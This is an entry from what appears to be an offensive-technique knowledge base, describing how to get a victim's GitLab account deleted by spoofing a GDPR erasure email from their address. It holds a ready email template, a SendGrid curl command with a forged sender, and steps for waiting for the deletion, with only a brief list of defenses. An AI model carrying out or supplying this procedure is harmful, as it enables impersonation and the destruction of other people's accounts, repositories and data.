---
tags:
  - gdpr
  - email-spoofing
  - misconfiguration
type: procedure
tools:
  - '[[tools/SendGrid]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Email
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:58.286Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: a1937e28-e177-4d83-be26-092378d9c43d
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Spoof-GDPR-Deletion-Request

## Summary

This procedure exploits a misconfiguration in GitLab's GDPR data deletion process by spoofing an email from the victim's address to the gdpr-request@gitlab.com endpoint, triggering unauthorized account deletion without any sender verification.

## Description

GitLab accepts GDPR deletion requests via email without authenticating the sender, relying solely on the spoofed From address. An attacker crafts an email requesting erasure under GDPR Article 17, using a reputable SMTP service to ensure delivery. GitLab then sends a confirmation to the victim and processes the deletion after a few days, leading to loss of account access, repositories, and data. This violates GDPR principles and enables service disruption.

## Requirements

1. Victim's GitLab username and email address
2. Access to an SMTP service supporting sender spoofing (e.g., SendGrid API key)
3. Basic knowledge of email headers and GDPR request formatting

## Defense

Defensive measures and detection strategies:

- Implement sender verification for sensitive requests (e.g., security questions or 2FA confirmation)
- Monitor for unusual GDPR request volumes or from internal IPs
- Use email authentication protocols like DMARC to prevent spoofing

## Objectives

1. Initiate unauthorized account deletion
2. Disrupt victim access to GitLab services
3. Demonstrate workflow misconfiguration risks

## Instructions

### Step 1: Set Up SMTP Service

**Context**: Configure SendGrid or similar to allow spoofing the victim's email as the sender.

No specific command; use SendGrid dashboard or API to create a sender identity. Ensure the service permits custom From headers.

### Step 2: Craft the Spoofed Email

**Context**: Compose the email body requesting deletion, referencing GDPR rights and including victim details.

Example email structure (send via SendGrid API or client):

Subject: GDPR Data Erasure Request for Account [Victim Username]

Body:

Dear GitLab GDPR Team,

Pursuant to Article 17 of the GDPR, I request the immediate erasure of my personal data associated with the account [Victim Email/Username]. Please process this deletion request without delay.

Best regards,
[Victim Name]

From: [Victim Email]
To: gdpr-request@gitlab.com

### Step 3: Send the Email

**Context**: Transmit the email using the SMTP service to bypass authentication checks.

Use SendGrid's API or SMTP relay to send. For API example (inferred from common usage):

```bash
curl -X POST https://api.sendgrid.com/v3/mail/send \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -d '{"personalizations":[{"to":[{"email":"gdpr-request@gitlab.com"}],"from":{"email":"victim@example.com"},"subject":"GDPR Data Erasure Request"},"content":[{"type":"text/plain","value":"Request erasure under GDPR Article 17 for account victim@example.com"}]}'
```

> This sends the spoofed request; expect delivery confirmation from SendGrid.

### Step 4: Monitor for Confirmation and Deletion

**Context**: Wait for GitLab's response and processing.

No command; observe victim's email for confirmation (arrives shortly) and account status after 2-3 days.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/SendGrid]]

## Tags

- [[gdpr]]
- [[email-spoofing]]
- [[account-deletion]]
